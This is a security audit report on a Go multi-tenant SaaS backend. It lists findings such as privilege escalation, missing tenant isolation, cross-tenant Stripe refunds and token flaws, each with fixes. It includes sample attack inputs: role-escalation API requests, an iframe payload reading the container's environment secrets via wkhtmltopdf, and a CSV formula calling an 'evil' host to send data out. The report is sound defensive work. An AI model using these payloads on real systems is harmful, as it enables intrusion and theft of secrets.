# ServicePro backend security audit

- **Scope:** `/Users/robavery/repositories/projects/saas/servicepro/backend` at master `3df4280`. This was a read-only review; no files were modified.
- **Deployment context:** an invite-gated preview on Cloud Run, behind Cloudflare at servicepro.sharkfins.xyz. The repo is public.
- **Tooling:** `go build ./...` passed and `go vet ./...` was clean. govulncheck reported 25 reachable vulnerabilities (see F-20). gosec was not run.
- **Verification:** every finding below was checked against the code at the file:line given. Anything that depends on runtime configuration is labelled **[conditional]**.

## TL;DR — not safe to expose yet

The backend has **no working tenant isolation**. On top of that, **any authenticated user can make themselves super_admin**.

Self-registration is open in the backend. Combined with the two problems above, an anonymous internet user can do the following:

1. Register.
2. Verify their email.
3. Call one endpoint.
4. Read, modify and delete every tenant's customers, jobs, quotes and invoices, and issue Stripe refunds on the platform account.

Fix F-1 through F-4 before any external user (even an invitee) gets an account.

---

## CRITICAL

### F-1 Any authenticated user can grant themselves any role, including super_admin, in any tenant
- **Code:**
  - `internal/api/routes/v1/tenants_routes.go:38-67`: the member and invitation routes have only `RequireAuth()`, with no permission check and no RequireTenant. The comments say "checked in handler", but nothing checks.
  - `internal/api/handlers/tenant_handler.go:286` (AddMember), `:349` (RemoveMember), `:410` (UpdateMemberRole): these pass the path `:id` and the body `role_id` straight to the service.
  - `internal/services/tenant_service.go:286-323` (AddMember) and `:347-362` (UpdateMemberRole): no check of the caller's membership or role, and no check of role hierarchy.
  - `internal/api/handlers/invitation_handler.go:46,102,135,172`: InviteMember, GetPendingInvitations, CancelInvitation and ResendInvitation have no admin or membership check either.
- **Exploit:**
  - `PUT /api/v1/tenants/{myTenant}/members/{myUserId}/role {"role_id":"00000000-0000-0000-0000-000000000001"}` makes the caller super_admin.
  - `POST /api/v1/tenants/{victimTenant}/members {"email":"me@x","role_id":"...0001"}` adds the caller to any tenant whose UUID they know.
  - Through F-2, a super_admin role in any tenant applies to all routes. Separately, `RemoveMember` lets anyone kick any member out of any tenant (except the owner).
- **Fix:**
  - Add a `RequireTenantRole(minHierarchy)` middleware for `/tenants/:id/...`. It must verify that the caller is an active member of `:id` with admin-or-higher role, and reject when `c.Param("id")` differs from the tenant in context.
  - In the service, reject `role_id` values whose hierarchy is at or above the caller's own, and never allow assigning super_admin through tenant membership.
  - Apply the same checks to the invitation endpoints.

### F-2 Permissions are global (a union across all tenants and system roles), not per tenant
- **Code:**
  - `internal/repository/permission_repository.go:25-58`: `GetUserPermissions` UNIONs the roles from `user_roles` and from every `tenant_users` row the user has.
  - `internal/services/permissions/checker.go:43` and `internal/api/middleware/permissions.go:133`: `CheckPermission(ctx, userID, perm)` has no tenant argument, and the Redis cache key is per user only (`checker.go:211`).
- **Exploit:**
  - Any user can `POST /api/v1/tenants` (`tenants_routes.go:20`, no permission needed). That makes them `admin` (role `...0002`, `tenant_service.go:119`), and admin holds every permission except four (`migrations/001_schema.sql:1266-1269`).
  - The admin permissions then apply on every route, including routes "for" other tenants.
  - A technician who is `user` in tenant A and creates their own tenant B also becomes admin in A.
- **Fix:**
  - Make permission checks tenant-scoped: `CheckPermission(ctx, userID, tenantID, perm)`, using only the role on `tenant_users(tenant_id = current)`, plus a separate, explicit platform-admin path.
  - Key the cache by `user:tenant`.
  - Run `RequireTenant` before `RequirePermission` on every business route.

### F-3 Business data has no tenant scoping at all (customers, jobs, quotes, invoices, payments, exports, reports, payment terms)
- **Code:**
  - The Go models have no `TenantID` field, e.g. `internal/models/customer.go:39` (`Customer`) and `internal/models/invoice.go:95` (`Invoice`). The only models with TenantID are payment methods/billing, membership, schedules and payment reminders.
  - The DB has nullable `tenant_id` columns (`migrations/001_schema.sql:1106-1141`), but nothing ever writes or filters them. For example, `internal/repository/customer_repository.go:45-55` (`GetByID` is `WHERE id = ?`), and `List`, `Search`, `Autocomplete` and `GetSearchStats` are the same.
  - The Customer, Quote, Invoice, Export, Report and Payment-terms route groups don't even run `RequireTenant` (see `routes/v1/*_routes.go`). Jobs run `RequireTenant` (`jobs_routes.go:14`), but the job repository ignores it.
  - `internal/services/unified_export_service.go:259-288`: `fetchCustomers` exports all customers in the database.
  - `internal/api/handlers/export_handler.go:212` together with `unified_export_service.go:936`: the export download only checks `id = ?`, with no owner or tenant check.
  - The A/R-aging service is the one place that filters `invoices.tenant_id` (`ar_aging_service.go:91,206`). Since `tenant_id` is never set, it always returns empty, a correctness bug.
- **Exploit:** with any account holding `customers.list` (which F-2 hands out to everyone), `GET /api/v1/customers` returns every company's customers, with PII and addresses. `/invoices`, `/quotes`, `/jobs`, `/exports` (full CSV dump) and `/reports/*` behave the same way. Writes and deletes are equally global.
- **Fix:**
  - Add `TenantID uuid.UUID` (NOT NULL) to every tenant-owned model, and set it from context on create.
  - Add a GORM scope `db.Scopes(TenantScope(tenantID))` to every query: list, get, update and delete must be `WHERE id = ? AND tenant_id = ?`.
  - Make the column `NOT NULL` in `001_schema.sql`, and make invoice, quote and job numbers unique per tenant rather than globally (`invoice_number VARCHAR(50) UNIQUE`, line 571, leaks cross-tenant existence).
  - Defence in depth: consider Postgres RLS with `SET app.tenant_id`.
  - Add integration tests where tenant B tries to read tenant A's IDs.

### F-4 Cross-tenant Stripe operations on the platform account (refunds, payment intents, customer lookup)
- **Code:**
  - `internal/api/routes/v1/stripe_routes.go:40-89`.
  - `internal/api/handlers/stripe_handler.go:341-370`: `CreateRefund` passes any `charge_id` or `payment_intent_id` from the body to Stripe with no ownership check.
  - `GetPaymentIntent`, `Confirm`, `Cancel` and `Capture` take any PaymentIntent ID, and `GetCustomer` (`:303`) takes any Stripe customer ID.
- **Exploit:** through F-1/F-2, any user gets `payments.refund`. They can then refund any customer payment collected through the platform's Stripe account (invoice checkouts), or read other tenants' Stripe customers.
- **Fix:**
  - Only act on Stripe objects whose IDs are stored in your DB for the caller's tenant, and look them up by `(tenant_id, local_id)`, never from a raw Stripe ID in the request body.
  - Consider removing these generic Stripe passthrough endpoints from the preview entirely.

---

## HIGH

### F-5 Other tenant-management endpoints act on any `:id` without checking membership
- **Code:**
  - `internal/api/handlers/tenant_handler.go:100` (GetTenant) and `:144` (UpdateTenant). These are guarded only by the global `tenants.read` / `tenants.update` (see F-2).
  - `internal/api/handlers/membership_handler.go:63, 109, 182, 234`, behind `membership_routes.go:16-36` (no RequireTenant). These can view or change another tenant's subscription tier and history.
  - Contrast: billing does it correctly (`billing_handler.go:323-345` compares the path id with the context tenant).
- **Exploit:** an admin of their own tenant can rename or re-slug, or downgrade or upgrade, any other tenant by UUID.
- **Fix:** use the same `:id == context tenant` check (or the RequireTenantRole middleware from F-1) on every `/tenants/:id/*` route.

### F-6 Open self-registration: the "invite-gated" preview is not enforced by the backend
- **Code:** `internal/api/routes/v1/auth_routes.go:16` registers `POST /auth/register` publicly. `internal/services/registration_service.go:40-104` has no invitation requirement.
- **Exploit:** anyone who finds the API, from the public repo or from the `*.run.app` URL, can create an account and chain F-1/F-2/F-3.
- **Fix:**
  - Add `REGISTRATION_MODE=invite_only`, so `Register` requires a valid pending invitation token whose email matches.
  - Put Cloudflare Access in front of the whole host for the preview.
  - Set Cloud Run ingress to "internal and Cloud Load Balancing" (or require a CF-origin secret header) so the `run.app` URL can't bypass Cloudflare.

### F-7 Client IP is attacker-controlled, so all IP-based rate limits can be bypassed
- **Code:**
  - `cmd/main.go:189-193` calls `SetTrustedProxies` only if `SERVER_TRUSTED_PROXIES` is non-empty, and the default is empty (`config/config.go:389`, `.env.example:27`). Gin's default then trusts all proxies, so `c.ClientIP()` returns the left-most `X-Forwarded-For` value, which the client controls.
  - The value is used by `ratelimit_api.go:196,211` (the global limiter), `ratelimit_invoice.go:48` (the public invoice, payment and token limiters) and `ratelimit.go:34`.
  - `RATE_LIMIT_TRUSTED_PROXIES` (`config.go:432`) is never wired up.
- **Exploit:** sending a random `X-Forwarded-For` per request bypasses the 100/min anonymous limit and the 10–20/min limits on public invoice and token endpoints. That enables token and invoice-number brute force, scraping and cost amplification.
- **Fix:**
  - Behind Cloudflare, use `router.TrustedPlatform = gin.PlatformCloudflare` (the `CF-Connecting-IP` header), and only accept it when the request came through Cloudflare (Cloud Run ingress restriction or origin secret, see F-6).
  - Otherwise call `router.SetTrustedProxies(nil)` and use the Cloud Run `X-Forwarded-For` right-most-minus-one logic.

### F-8 PDF export: unescaped user HTML fed to wkhtmltopdf with `--enable-local-file-access` [conditional]
- **Code:**
  - `internal/services/unified_export_service.go:817` writes `opts.HeaderText` (from the request body, `models/export.go:149`) raw into HTML.
  - `:848` writes customer and job fields into `<td>` via `Sprintf` with no escaping.
  - `internal/services/pdf_service.go:367` always passes `--enable-local-file-access`.
- **Exploit:** `POST /api/v1/exports {"format":"pdf","options":{"header_text":"<iframe src='file:///proc/self/environ' width=2000 height=2000>"}}` renders the container's environment (JWT_SECRET, STRIPE_SECRET_KEY, DATABASE_URL) into a downloadable PDF. `<img src=http://internal/...>` gives SSRF.
- **Condition:** this only works if `wkhtmltopdf` is installed in the runtime image. The current `Dockerfile` (alpine, no wkhtmltopdf) does not install it, so today PDF export just fails. The risk becomes live the moment someone adds it.
- **Fix:**
  - Build the HTML with `html/template`, or `html.EscapeString` every interpolated value.
  - Drop `--enable-local-file-access` and add `--disable-local-file-access --disable-javascript`.
  - Better: generate the PDF with gofpdf like `document_pdf_service.go` already does.

---

## MEDIUM

### F-9 Stripe webhook (`/api/v1/webhooks/stripe`) panics on subscription and invoice events
- **Code:** `internal/api/handlers/webhook_handler.go:108,130,165`. The code asserts `ctx.(interface{ Request() *http.Request })`, but `ctx` is the `context.Context` from `c.Request.Context()`, so this is an unchecked type assertion that always panics.
- **Impact:** every `customer.subscription.*`, `invoice.paid` and `invoice.payment_failed` event panics, the recovery middleware returns 500, and Stripe retries for 3 days. Subscription state never syncs, and Sentry gets flooded. This is an integrity and availability bug in billing.
- **Fix:** pass `context.Context` directly. Also note that there are two Stripe webhook endpoints (`/webhooks/stripe` here and `/stripe/webhooks` in `stripe_routes.go:33`); keep one.

### F-10 Stripe webhook dedupe and replay handling is unsafe on Cloud Run
- **Code:**
  - `internal/services/stripe/webhook.go:34,106-127`: the dedupe set is an in-memory map, with a non-atomic check-then-mark around the processing. It is lost on restart and not shared across instances.
  - `:238` rejects events whose `event.Created` is older than 5 minutes. Stripe retries keep the original `Created`, so **every retry after 5 minutes is rejected** (400). One failed first delivery means a payment is never recorded. Replay protection is already provided by the signature timestamp check in `ConstructEvent`.
  - `:144`: `io.ReadAll(r.Body)` has no size cap (unauthenticated endpoint).
  - `internal/services/invoice_service.go:672-698`: `MarkInvoiceAsPaid` does a read-modify-write `amount_paid += x` with no row lock and no uniqueness on `stripe_checkout_session_id`. A duplicate delivery to two instances double-credits a partially paid invoice.
- **Fix:**
  - Persist processed event IDs (a `stripe_events(id PK)` table, `INSERT ... ON CONFLICT DO NOTHING` inside the processing transaction).
  - Remove the `event.Created` age check.
  - Wrap the body in `http.MaxBytesReader(…, 64KB)`.
  - Make `MarkInvoiceAsPaid` idempotent on the session ID: add a unique index, and use `SELECT ... FOR UPDATE`.

### F-11 A refresh token is accepted as an access token, and tokens are never revoked
- **Code:**
  - `internal/api/middleware/permissions.go:85-110`: `RequireAuth` never checks `claims.Type == access`. Only `auth_service.go:127` checks the type, and only for refresh.
  - `auth_handler.go:188` (Logout) only clears cookies.
  - `password_reset_service.go:141`: a password reset doesn't invalidate existing tokens.
  - There is no `jti` and no denylist, and no token-version column.
- **Exploit:** a stolen 7-day refresh token works as a bearer token on every API route. After a password reset or logout, an attacker's tokens stay valid for up to 7 days, re-minted indefinitely through `/auth/refresh`.
- **Fix:**
  - Reject `Type != access` in `RequireAuth`.
  - Add `users.token_version` (or `password_changed_at`), embed it in the claims and check it on refresh and auth; bump it on password reset and logout-all.
  - Store refresh tokens' `jti` in Redis and rotate them single-use.

### F-12 Account lockout DoS and account enumeration on login
- **Code:**
  - `internal/services/auth_service.go:41-58`: an unknown email returns immediately with no bcrypt (a timing oracle). Locked and unverified accounts return distinct 403 errors **before** the password is checked (`auth_handler.go:74-86`).
  - `:96-114`: 5 failures lock the account for 30 minutes, keyed only on the account.
  - Other enumeration paths: `tenant_service.go:290` returns "user not found with email: X" through `tenant_handler.go` (AddMember error message), and `/auth/register` returns 409.
- **Exploit:**
  - An attacker can lock any known user out indefinitely, 5 requests every 30 minutes.
  - They can enumerate which emails have accounts.
- **Fix:**
  - Check the password first (always run bcrypt against a dummy hash for unknown users), and then return the same generic 401.
  - Replace the hard lockout with exponential backoff per (account, IP), or with a CAPTCHA/Turnstile after N failures.
  - Return generic errors from AddMember.

### F-13 CSV formula injection in exports
- **Code:** `internal/services/unified_export_service.go:419-560` (`write*CSV`) and `pkg/csv/exporter.go:22-90` write user-controlled fields (names, company, notes, addresses) as-is.
- **Exploit:** a customer named `=HYPERLINK("http://evil/?"&A2,"x")`, or one carrying a DDE payload, executes when an office user opens the export in Excel or Sheets.
- **Fix:** prefix cells starting with `= + - @ \t \r` with `'`. (XLSX via excelize `SetCellValue` with strings is not affected.)

### F-14 Email client silently falls back to the mock provider, which logs reset, verification and invite links [conditional]
- **Code:**
  - `pkg/clients/email/factory.go:91-92`: if no provider is configured, it falls back to `ProviderMock`.
  - `pkg/clients/email/mock/mock.go:102,121,131,152,155` log the full reset, verification and invitation URLs, tokens included.
- **Exploit:** if Resend/SES/SMTP env is missing in Cloud Run, users never get email, and anyone with log access (Logtail, Loki, Sentry breadcrumbs) can take over accounts.
- **Fix:** fail startup when `ENV=production` (or preview) and the provider resolves to mock, and never log token-bearing URLs.

### F-15 Infrastructure endpoints are exposed without auth [conditional]
- `/health` (`internal/api/routes/routes.go:84`) returns the full dependency report publicly (DB/Redis status and error strings, memory). Restrict it to `/health/live` and `/health/ready`, or require a token.
- `/metrics` (`routes.go:134`), when `PROMETHEUS_ENABLED=true`, is public and includes platform KPIs (`pkg/database/kpi_metrics.go`: tenants, users, revenue, A/R outstanding). Serve it on a separate port or behind auth.
- Swagger UI (`routes.go:94-105`) and Gin debug mode (`cmd/main.go:109`) are enabled whenever `ENV != "production"`. A preview deployed with `ENV=preview` or `staging` exposes the full API map. Gate both on an explicit `SWAGGER_ENABLED`, and set `ENV=production` on Cloud Run.

### F-16 Cookie and CSRF posture depends on env that defaults to insecure [conditional]
- **Code:** `config/config.go:418`: `COOKIE_SECURE` defaults to `false`. Auth is cookie-first (`permissions.go:52`), with SameSite=Lax and no CSRF token.
- **Risk:** Gin's `ShouldBindJSON` ignores Content-Type, so a `text/plain` form POST carrying JSON is accepted. SameSite=Lax does not protect against **same-site** origins, and every `*.sharkfins.xyz` subdomain (blog, fleet, …) is same-site. So any XSS or subdomain takeover on a sibling site can CSRF the API.
- **Fix:**
  - Set `COOKIE_SECURE=true` and `COOKIE_SAMESITE=Strict`.
  - Reject non-`application/json` bodies on mutating routes.
  - Or require a custom header (`X-Requested-With` / CSRF token) on state-changing requests.

---

## LOW / informational

- **F-17 Errors leak internals.** About 160 handler sites return `err.Error()` to clients. Examples: `assignment_handler.go:377,423,475,541`, `ar_aging_handler.go:75`, `tenant_handler.go` (AddMember), and `permissions.go:89` (JWT parse error). DB and driver messages reach the client. Log the error server-side and return generic messages.
- **F-18 Unauthenticated SES webhooks.**
  - `auth_routes.go:29-30`, handled at `email_verification_handler.go:137-235`, has no SNS signature verification.
  - Impact today is small: it only clears `verification_sent_at` for unverified users (`email_verification_service.go:258-292`).
  - The SubscriptionConfirmation branch echoes the SubscribeURL.
  - Verify SNS signatures (or remove the routes until SES is used).
- **F-19 Profile-picture decompression bomb.** `internal/services/profile_picture_service.go:72` calls `image.Decode` on up to 2 MB, but a small PNG can declare 50k×50k pixels, which means GBs of RAM and an OOM-killed instance. Call `image.DecodeConfig` first and reject images over about 4000×4000. Size and type are otherwise handled well: the file is re-encoded to JPEG and the S3 key is `profile-pictures/<userID>.jpg`, so there's no traversal.
- **F-20 Dependencies and toolchain** (govulncheck, symbol-level reachable):
  - Go stdlib 1.27.1 (net/http, http2, textproto, crypto/tls, html/template): 12 vulnerabilities, fixed in 1.27.2.
  - `golang.org/x/net` v0.49.0: fix at v0.60.0 or later.
  - `golang.org/x/text` v0.33.0: fix at v0.41.0 or later.
  - `github.com/jackc/pgx/v5` v5.6.0: GO-2026-5004, SQL injection via placeholder confusion with dollar-quoted literals. Fix at v5.9.2 or later.
  - `github.com/xuri/excelize/v2` v2.10.0: fix at v2.11.0.
  - `google.golang.org/grpc` v1.77.0: fix at v1.83.1.
  - `go.opentelemetry.io/otel*` v1.39.0: fix at v1.45.0.
  - aws-sdk-go-v2 s3 v1.96.0: fix at v1.97.3; eventstream: fix at v1.7.8.
  - `quic-go` v0.59.0: fix at v0.59.1.
  - The `Dockerfile` builds with `golang:1.24-alpine` (EOL, many more stdlib CVEs than the local 1.27.1 scan shows) and runs `alpine:latest` (unpinned). Pin `golang:1.27.2-alpine` or later and a digest-pinned runtime image; consider distroless.
  - Full output is in `govuln.txt` next to this report.
- **F-21 Broken public invoice route.** `invoices_routes.go:83` mounts the authenticated `GetInvoice` handler on the unauthenticated path `/public/invoices/:invoice_number`. It currently always returns 400 because the handler reads `c.Param("id")`, but a "fix" of the param name would expose any invoice by number without auth. Delete the route.
- **F-22 Global rate limiter never sees authenticated users.** `ratelimit_api.go:161,187` looks for context key `"userID"`, but auth sets `"user_id"`, and the limiter runs before auth anyway. All traffic is limited as anonymous at 100/min per (spoofable, F-7) IP, so legitimate users behind one NAT get throttled. Login rate limiting (`ratelimit.go:30-76`) is keyed on email only and fails open if Redis errors.
- **F-23 Import endpoint has no explicit size or row cap.** `import_export_handler.go:64-95` reads the whole upload into memory with no `MaxBytesReader` (Cloud Run's 32 MB request cap is the only bound). Add a size and row limit.
- **F-24 PII and SQL in logs.** Emails are logged widely (e.g. `password_reset_service.go:72`). GORM slow-query logging (`pkg/database/logger.go:155-168`) logs SQL with interpolated values, which can include emails and password hashes on slow `UPDATE users`.
- **F-25 Dead and unsafe code to delete.**
  - `pdf_service.go:409` `ProcessImage` does `http.Get(arbitraryURL)` (unused, but SSRF-shaped).
  - `download_handler.go` is not routed.
  - `AccessControlMiddleware` (`middleware/access_control.go`) is never wired up.
  - `jwt_tenant_id` is read in `tenant.go:90` but never set by `RequireAuth`, so the JWT `tenant_id` claim is dead and the fallback is "first tenant".

---

## Checked and OK

- **JWT secret:** `validateConfig` (`config/config.go:592-620`) fatally rejects an empty value, the known default, or one under 32 characters.
- **JWT algorithm:** pinned to the HMAC family (`pkg/auth/jwt.go:103`); expiry is enforced (1h access, 7d refresh).
- **bcrypt cost:** 12 (`pkg/auth/password.go:9`).
- **Password reset and verification tokens:** 32 bytes from crypto/rand (`pkg/auth/token.go`), stored in Redis with a TTL (1h / 24h), and deleted after use (single-use). Reset-request doesn't reveal whether the email exists. Invitation tokens are random, the email is matched case-insensitively on accept (`invitation_service.go:217`), and the token is not serialized (`json:"-"`).
- **Stripe signature verification:** `webhook.ConstructEvent*` is called on the raw body in both handlers.
- **Money:** `shopspring/decimal` with DECIMAL(12,2) columns, and `ConvertDecimalToCents` for Stripe. Floats only appear in PDF display.
- **SQL injection:** none found. All `Where`/`Raw` calls are parameterized, ORDER BY goes through allowlists (`internal/utils/safe_order.go`), and full-text search uses `plainto_tsquery` with bound parameters. The revenue `Sprintf` (`revenue_service.go:203`) only inserts fixed `DATE_TRUNC` strings.
- **CORS:** exact-origin allowlist; it warns about but doesn't block `*` with credentials (`cors.go`). Note that `X-Tenant-ID` is not in the default `CORS_ALLOWED_HEADERS`, which only matters cross-origin.
- **Security headers:** present, with HSTS in production (`security_headers.go`).
- **Secrets in git:** no `.env` or secrets are tracked (`git ls-files` shows only `*.env.example`).
- **SSRF:** no user-configurable outbound webhooks exist. Outbound calls go only to fixed or config URLs (health notifications, Loki, BetterStack, Textbelt).

## Recommended order of work before preview launch
1. F-1, F-5: authorize every `/tenants/:id/*` route by membership and role hierarchy.
2. F-2: make permission checks tenant-scoped.
3. F-3: add a tenant_id column, filter and NOT NULL everywhere, plus cross-tenant tests.
4. F-4: remove or scope the raw Stripe passthrough endpoints.
5. F-6, F-7: invite-only registration, Cloudflare Access or ingress lock-down, and correct client-IP handling.
6. F-9, F-10, F-11, F-14, F-16: webhook robustness, token type and revocation, email provider guard, cookie flags.
7. F-20: bump the Go toolchain and the vulnerable modules, and pin the Docker images.
